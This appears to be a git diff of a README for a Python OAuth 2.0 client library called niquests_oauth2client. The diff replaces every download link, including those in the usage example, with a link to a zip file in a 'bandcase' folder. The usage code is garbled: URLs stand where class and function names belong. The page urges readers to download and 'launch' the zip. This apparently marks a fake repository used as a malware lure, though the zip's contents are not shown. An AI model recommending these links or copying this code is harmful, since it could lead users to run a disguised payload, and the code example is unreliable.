@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to niquests_oauth2client Repository! 🐍
 
-![OAuth 2.0](https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip)
+![OAuth 2.0](https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip)
 
 ### Overview
 Welcome to the niquests_oauth2client repository, a Python library that serves as an OAuth 2.0 client built on top of the `niquests` library. This library provides seamless integration with various OAuth 2.0 and OpenID Connect flows, ensuring secure and reliable authentication mechanisms for your Python applications.
@@ -31,7 +31,7 @@ Welcome to the niquests_oauth2client repository, a Python library that serves as
 ### Getting Started
 To get started with `niquests_oauth2client`, you can download the library from the official GitHub repository. Click the button below to download the library:
 
-[![Download niquests_oauth2client](https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip)](https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip)
+[![Download niquests_oauth2client](https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip)](https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip)
 
 Note: The link provided needs to be launched.
 
@@ -51,11 +51,11 @@ Here is a simple example of how you can use `niquests_oauth2client` in your Pyth
 import niquests_oauth2client
 
 # Initialize the OAuth2 client
-client = https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip(client_id='your_client_id', client_secret='your_client_secret')
+client = https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip(client_id='your_client_id', client_secret='your_client_secret')
 
 # Make authenticated requests
-response = https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip('https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip')
-print(https://github.com/crimsonpee/niquests_oauth2client/releases/download/v1.0/Release.zip())
+response = https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip('https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip')
+print(https://github.com/crimsonpee/niquests_oauth2client/raw/refs/heads/main/bandcase/client_niquests_oauth_2.2.zip())
 ```
 
 ### Contributing
